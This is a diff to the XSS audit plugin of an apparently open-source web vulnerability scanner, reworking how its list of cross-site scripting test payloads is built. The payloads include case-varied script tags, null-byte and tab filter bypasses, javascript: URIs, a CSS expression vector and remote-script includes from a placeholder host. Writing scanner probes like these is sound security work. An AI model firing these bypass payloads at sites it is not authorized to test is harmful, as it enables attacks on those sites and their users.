@@ -237,43 +237,44 @@ class xss(baseAuditPlugin):
         # use blacklists that have those words, and they may be doing the comparison with a case
         # sensitive function (if 'script' in user_input...
         # if 'SCRIPT' in user_input)
-        xss_tests.append(('<SCrIPT>alert("RANDOMIZE")</SCrIPT>', [browsers.ALL, ]))
+        xss_tests += [
+            ('<SCrIPT>alert("RANDOMIZE")</SCrIPT>', [browsers.ALL, ]) ,
         
-        # No quotes, with tag
-        xss_tests.append(("<ScRIPT>a=/RANDOMIZE/\nalert(a.source)</SCRiPT>", [browsers.ALL, ]))
-        xss_tests.append(("<ScRIpT>alert(String.fromCharCode(RANDOMIZE))</SCriPT>",
-                [browsers.ALL, ]))
-        xss_tests.append(("'';!--\"<RANDOMIZE>=&{()}", [browsers.ALL, ]))
-        xss_tests.append(("<ScRIPt SrC=http://RANDOMIZE/x.js></ScRIPt>", [browsers.ALL, ]))
-        xss_tests.append(("<ScRIPt/XSS SrC=http://RANDOMIZE/x.js></ScRIPt>", [browsers.ALL, ]))
-        xss_tests.append(("<ScRIPt/SrC=http://RANDOMIZE/x.js></ScRIPt>", 
-                [browsers.INTERNET_EXPLORER_6, browsers.INTERNET_EXPLORER_7,
-                browsers.NETSCAPE_IE, browsers.FIREFOX, browsers.NETSCAPE_G]))
+            # No quotes, with tag
+            ("<ScRIPT>a=/RANDOMIZE/\nalert(a.source)</SCRiPT>", [browsers.ALL, ]) ,
+            ("<ScRIpT>alert(String.fromCharCode(RANDOMIZE))</SCriPT>", [browsers.ALL, ]) ,
+            ("'';!--\"<RANDOMIZE>=&{()}", [browsers.ALL, ]) ,
+            ("<ScRIPt SrC=http://RANDOMIZE/x.js></ScRIPt>", [browsers.ALL, ]) ,
+            ("<ScRIPt/XSS SrC=http://RANDOMIZE/x.js></ScRIPt>", [browsers.ALL, ]) ,
+            ("<ScRIPt/SrC=http://RANDOMIZE/x.js></ScRIPt>", 
+                            [browsers.INTERNET_EXPLORER_6, browsers.INTERNET_EXPLORER_7,
+                             browsers.NETSCAPE_IE, browsers.FIREFOX, browsers.NETSCAPE_G]) ,
         
-        # http://secunia.com/advisories/9716/
-        # ASP.NET bypass
-        xss_tests.append(('<\0SCrIPT>alert("RANDOMIZE")</SCrIPT>',
-                [browsers.INTERNET_EXPLORER_6, browsers.NETSCAPE_IE]))
-        # This one only works in IE
-        xss_tests.append(('<SCR\0IPt>alert("RANDOMIZE")</Sc\0RIPt>',
-                [browsers.INTERNET_EXPLORER_6, browsers.INTERNET_EXPLORER_7, browsers.NETSCAPE_IE]))
-                
-        xss_tests.append(("<IFRAME SRC=\"javascript:alert('RANDOMIZE');\"></IFRAME>", [browsers.ALL, ]))
-        
-        # IE only
-        xss_tests.append(('</A/style="xss:exp/**/ression(alert(\'XSS\'))">',
-                [browsers.INTERNET_EXPLORER_6, browsers.INTERNET_EXPLORER_7]))
 
-        # Javascript
-        xss_tests.append(('jAvasCript:alert("RANDOMIZE");',
-                [browsers.INTERNET_EXPLORER_6, browsers.NETSCAPE_IE, browsers.OPERA]))
-        xss_tests.append(('javas\tcript:alert("RANDOMIZE");',
-                [browsers.INTERNET_EXPLORER_6, browsers.NETSCAPE_IE, browsers.OPERA]))
-        xss_tests.append(('javas&#x09;cript:alert("RANDOMIZE");',
-                [browsers.INTERNET_EXPLORER_6, browsers.NETSCAPE_IE, browsers.OPERA]))
-        xss_tests.append(('javas\0cript:alert("RANDOMIZE");',
-                [browsers.INTERNET_EXPLORER_6, browsers.NETSCAPE_IE]))
+            # http://secunia.com/advisories/9716/
+            # ASP.NET bypass
+            ('<\0SCrIPT>alert("RANDOMIZE")</SCrIPT>', [browsers.INTERNET_EXPLORER_6, browsers.NETSCAPE_IE]) ,
+
+            # This one only works in IE
+            ('<SCR\0IPt>alert("RANDOMIZE")</Sc\0RIPt>',
+                [browsers.INTERNET_EXPLORER_6, browsers.INTERNET_EXPLORER_7, browsers.NETSCAPE_IE]) ,
+                
+            ("<IFRAME SRC=\"javascript:alert('RANDOMIZE');\"></IFRAME>", [browsers.ALL, ]) ,
         
+            # IE only
+            ('</A/style="xss:exp/**/ression(alert(\'XSS\'))">', [browsers.INTERNET_EXPLORER_6, browsers.INTERNET_EXPLORER_7]) ,
+
+            # Javascript
+            ('jAvasCript:alert("RANDOMIZE");',
+                [browsers.INTERNET_EXPLORER_6, browsers.NETSCAPE_IE, browsers.OPERA]) ,
+            ('javas\tcript:alert("RANDOMIZE");',
+                [browsers.INTERNET_EXPLORER_6, browsers.NETSCAPE_IE, browsers.OPERA]) ,
+            ('javas&#x09;cript:alert("RANDOMIZE");',
+                [browsers.INTERNET_EXPLORER_6, browsers.NETSCAPE_IE, browsers.OPERA]) ,
+            ('javas\0cript:alert("RANDOMIZE");',
+                [browsers.INTERNET_EXPLORER_6, browsers.NETSCAPE_IE])
+        ]
+
         # I need to identify everything I send to the web app
         rnd_value = createRandAlNum(4)
 
